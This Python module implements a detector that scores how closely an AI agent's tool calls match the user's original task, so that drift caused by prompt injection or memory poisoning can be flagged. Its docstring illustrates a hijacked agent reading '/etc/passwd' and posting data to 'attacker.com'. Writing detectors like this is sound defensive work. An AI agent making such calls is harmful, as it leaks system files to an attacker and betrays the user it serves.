"""
Intent-Tool Alignment Scorer — the most forward-looking component.

Hypothesis: When an AI agent is hijacked (by prompt injection, memory
poisoning, or a compromised sub-agent), its TOOL CALLS diverge from
its STATED GOAL.

Example:
  User task: "Summarise my calendar for today"
  Normal tools: list_calendar_events, read_event
  Hijacked tools: read_file("/etc/passwd"), http_post("attacker.com", ...)

We score alignment between:
  1. The original user task (embedded at session start)
  2. Each subsequent tool call (tool name + arguments)

Alignment score ≈ cosine similarity in a simple TF-IDF embedding space.
Below 0.3 = severe drift = possible hijack.

Note: We use TF-IDF (no external model needed) for latency and portability.
If you have sentence-transformers available, swap in that encoder for
much better semantic alignment — the interface is the same.
"""
import math
import re
from collections import defaultdict, Counter
from typing import Any


def tokenise(text: str) -> list[str]:
    """Simple word tokeniser that handles tool names like read_file."""
    if not isinstance(text, str):
        text = str(text)
    text = text.lower()
    # Split on underscores too so read_file → [read, file]
    text = re.sub(r'[_\-/\\]', ' ', text)
    return re.findall(r'[a-z]{2,}', text)


class TFIDF:
    """Minimal TF-IDF implementation — no dependencies."""
    def __init__(self):
        self._df: Counter = Counter()  # document frequency
        self._n: int = 0

    def add_document(self, tokens: list[str]):
        self._n += 1
        for t in set(tokens):
            self._df[t] += 1

    def vector(self, tokens: list[str]) -> dict[str, float]:
        tf   = Counter(tokens)
        n    = max(len(tokens), 1)
        vec  = {}
        for t, count in tf.items():
            df = self._df.get(t, 1)
            idf = math.log((self._n + 1) / (df + 1)) + 1.0
            vec[t] = (count / n) * idf
        # L2 normalise
        norm = math.sqrt(sum(v*v for v in vec.values())) or 1.0
        return {t: v/norm for t, v in vec.items()}

    def cosine(self, a: dict, b: dict) -> float:
        keys = set(a) & set(b)
        return sum(a[k] * b[k] for k in keys)


class IntentAlignmentScorer:
    def __init__(self):
        self._tfidf = TFIDF()
        self._session_goals: dict[str, dict] = {}  # session_id → TF-IDF vector

    def score(self, call: dict) -> dict:
        session_id = call["session_id"]

        # Extract user intent from context (if present and first call)
        context    = call.get("context", "")
        tool_text  = f"{call['tool_name']} {str(call.get('arguments',''))}"
        tool_tokens = tokenise(tool_text)

        # Register corpus
        self._tfidf.add_document(tool_tokens)
        if context:
            ctx_tokens = tokenise(context)
            self._tfidf.add_document(ctx_tokens)

        # If no goal recorded for session yet, record from context
        if session_id not in self._session_goals and context:
            ctx_tokens = tokenise(context)
            if ctx_tokens:
                self._session_goals[session_id] = self._tfidf.vector(ctx_tokens)

        if session_id not in self._session_goals:
            return {"alignment_score": 1.0, "status": "no_goal_recorded"}

        goal_vec = self._session_goals[session_id]
        tool_vec = self._tfidf.vector(tool_tokens)
        score    = self._tfidf.cosine(goal_vec, tool_vec)

        return {
            "alignment_score": round(float(score), 4),
            "status":          "scored",
            "tool_tokens":     tool_tokens[:10],
        }
